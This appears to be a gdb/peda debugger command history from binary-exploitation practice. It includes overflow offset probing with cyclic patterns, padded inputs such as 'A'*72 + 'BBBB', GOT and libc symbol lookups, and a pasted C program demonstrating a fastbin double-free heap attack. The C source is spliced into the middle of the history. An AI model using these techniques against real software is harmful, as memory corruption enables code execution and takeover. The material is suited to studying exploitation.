pattern create 500
r
pattern offset 0x65414149
pdisas main
pattern create 100
r
pattern offset 0x65414149
pdisas main
ni
pdisas #include <stdio.h>
#include <stdlib.h>
int main()
{
fprintf(stderr, "This file demonstrates a simple double-free attack with fastbins.\n");
fprintf(stderr, "Allocating 3 buffers.\n");
int *a = malloc(8);
int *b = malloc(8);
int *c = malloc(8);
fprintf(stderr, "1st malloc(8): %p\n", a);
fprintf(stderr, "2nd malloc(8): %p\n", b);
fprintf(stderr, "3rd malloc(8): %p\n", c);
fprintf(stderr, "Freeing the first one...\n");
free(a);
fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
// free(a);
fprintf(stderr, "So, instead, we'll free %p.\n", b);
free(b);
fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
free(a);
fprintf(stderr, "1st malloc(8): %p\n", malloc(8));
fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
fprintf(stderr, "3rd malloc(8): %p\n", malloc(8));
pdisas 0xf7e65b59
ni
c
ni
ni
c
ni
pdisas main
ni
pdisas 0xf7dd0c70
ni
b *main
r
vmmap
ni
r
r
clear
elfsymbol
pdisas main
b *main+153
r <<< $(python -c "print 'A' * 100")
r <<< $(python -c "print 'A' * 72")
r <<< $(python -c "print 'A' * 76")
r <<< $(python -c "print 'A' * 72 + 'BBBB'")
pd main
b *0x08048515
r
got
x/gx 0804a014
x/gx 0x0804a014
x/wx 0x0804a014
x/wx 0x080483d6
elfsymbol ot
elfsymbol gets
x/wx 0x804a014
vmmap
bmmap libc
vmmap libc
r
elfsymbol
elfsymbol gets
x/wx 0x804a014
x/gx 0x804a014
x/wx 0x804a014
vmmap libc
r
vmmap libc
elfsymbol
elfsymbol gets
got
elfsymbol
elfsymbol gets
elfsymbol printf
elfsymbol fflush
pd main
c
ni
pd 0xf7d9b1b0
pd 0xf7d6f830
pd 0xf7ebc352
x/s 0xf7ebc352
